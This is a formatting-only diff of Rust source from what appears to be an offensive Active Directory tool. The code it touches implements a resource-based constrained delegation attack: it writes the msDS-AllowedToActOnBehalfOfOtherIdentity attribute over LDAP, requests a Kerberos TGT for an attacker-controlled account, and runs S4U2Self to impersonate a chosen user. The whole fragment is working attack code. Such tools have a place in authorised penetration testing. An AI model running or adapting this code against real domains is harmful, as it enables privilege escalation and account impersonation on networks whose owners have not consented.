@@ -169,11 +169,7 @@ fn parse_sid_string(sid_str: &str) -> Result<Vec<u8>> {
 ///
 /// NOTE: You must add `modify_replace` to your LdapSession impl in
 /// overthrone-core/src/proto/ldap.rs for this to compile. See bottom of file.
-async fn write_rbcd_attribute(
-    config: &HuntConfig,
-    target_dn: &str,
-    sd_bytes: &[u8],
-) -> Result<()> {
+async fn write_rbcd_attribute(config: &HuntConfig, target_dn: &str, sd_bytes: &[u8]) -> Result<()> {
     info!(
         "LDAP: Writing msDS-AllowedToActOnBehalfOfOtherIdentity on {}",
         target_dn
@@ -185,7 +181,8 @@ async fn write_rbcd_attribute(
         &config.username,
         &config.secret,
         config.use_ldaps,
-    ).await?;
+    )
+    .await?;
 
     conn.modify_replace(
         target_dn,
@@ -212,7 +209,8 @@ async fn clear_rbcd_attribute(config: &HuntConfig, target_dn: &str) -> Result<()
         &config.username,
         &config.secret,
         config.use_ldaps,
-    ).await?;
+    )
+    .await?;
 
     conn.modify_delete(target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity")
         .await?;
@@ -232,7 +230,8 @@ async fn resolve_computer_dn(config: &HuntConfig, computer_name: &str) -> Result
         &config.username,
         &config.secret,
         config.use_ldaps,
-    ).await?;
+    )
+    .await?;
 
     let computers = conn.enumerate_computers().await?;
     conn.disconnect().await?;
@@ -302,10 +301,9 @@ pub async fn run(config: &HuntConfig, rc: &RbcdConfig) -> Result<RbcdResult> {
     }
 
     // Step 3: Request TGT for the controlled account
-    let controlled_secret = rc
-        .controlled_secret
-        .as_deref()
-        .ok_or_else(|| OverthroneError::custom("RBCD S4U requires controlled account credentials"))?;
+    let controlled_secret = rc.controlled_secret.as_deref().ok_or_else(|| {
+        OverthroneError::custom("RBCD S4U requires controlled account credentials")
+    })?;
 
     let tgt = kerberos::request_tgt(
         &config.dc_ip,
@@ -323,8 +321,7 @@ pub async fn run(config: &HuntConfig, rc: &RbcdConfig) -> Result<RbcdResult> {
     );
 
     // Step 4: S4U2Self → impersonate target user
-    let s4u2self_ticket =
-        kerberos::s4u2self(&config.dc_ip, &tgt, &rc.impersonate_user).await?;
+    let s4u2self_ticket = kerberos::s4u2self(&config.dc_ip, &tgt, &rc.impersonate_user).await?;
 
     info!(
         " {} S4U2Self as {} obtained",
